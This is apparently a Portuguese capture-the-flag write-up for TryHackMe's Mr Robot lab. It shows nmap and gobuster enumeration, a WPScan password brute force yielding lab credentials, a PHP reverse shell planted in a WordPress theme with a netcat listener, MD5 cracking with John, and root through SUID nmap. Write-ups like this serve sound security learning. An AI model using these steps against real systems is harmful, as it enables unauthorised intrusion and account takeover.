# Mr Robot CTF — TryHackMe

## 📌 Informações

| Campo | Detalhe |
|---|---|
| Plataforma | TryHackMe |
| Dificuldade | Médio |
| OS | Linux |
| Tags | Enumeration, Brute Force, WPScan, Privilege Escalation |

---

## 🔍 1. Reconhecimento

Inicio o scan com Nmap para identificar portas e serviços ativos:

```bash
nmap -sC -sV -oN nmap.txt <IP>
```

**Resultado:**
- Porta 80 — HTTP (Apache)
- Porta 443 — HTTPS
- Porta 22 — SSH (filtrado)

---

## 🌐 2. Enumeração Web

Acesso o site no navegador — tema inspirado na série Mr. Robot.

Enumero diretórios com Gobuster:

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

**Descobertas importantes:**
- `/robots.txt` — contém a **key-1** e um arquivo `fsocity.dic` (wordlist)
- `/wp-login` — painel WordPress

---

## 🔑 3. Primeira Flag

Acesso `/robots.txt` diretamente no navegador:
User-agent: *
fsocity.dic
key-1-of-3.txt
**Flag 1 capturada** ✅

---

## 💥 4. Brute Force no WordPress

Uso o `fsocity.dic` como wordlist para o WPScan:

```bash
wpscan --url http://<IP> -U elliot -P fsocity.dic
```

Credenciais encontradas: `elliot : ER28-0652`

---

## 🐚 5. Shell Reverso

No painel WordPress, edito um tema PHP com um reverse shell:

- Acesso **Appearance → Editor → 404.php**
- Substituo o conteúdo pelo reverse shell da `/usr/share/webshells/php/`
- Abro listener:

```bash
nc -lvnp 4444
```

- Acesso a página 404 para acionar o shell

Shell obtido como `daemon` ✅

---

## ⬆️ 6. Escalação de Privilégios

Navego até `/home/robot` e encontro:

- `key-2-of-3.txt` — sem permissão de leitura
- `password.raw-md5` — hash MD5 do usuário robot

Quebro o hash com o John:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Senha encontrada. Troco para o usuário robot:

```bash
su robot
```

**Flag 2 capturada** ✅

---

## 🔓 7. Root

Procuro binários com SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Encontro o `nmap` com SUID. Uso modo interativo para escalar:

```bash
nmap --interactive
!sh
```

Acesso `/root/key-3-of-3.txt`

**Flag 3 capturada** ✅

---

## 📝 Resumo

| Flag | Onde encontrar | Técnica |
|---|---|---|
| Flag 1 | /robots.txt | Enumeração web |
| Flag 2 | /home/robot | Brute Force + Hash Cracking |
| Flag 3 | /root | SUID Privilege Escalation |

---

## 🛠️ Ferramentas Utilizadas

- Nmap
- Gobuster
- WPScan
- Netcat
- John the Ripper
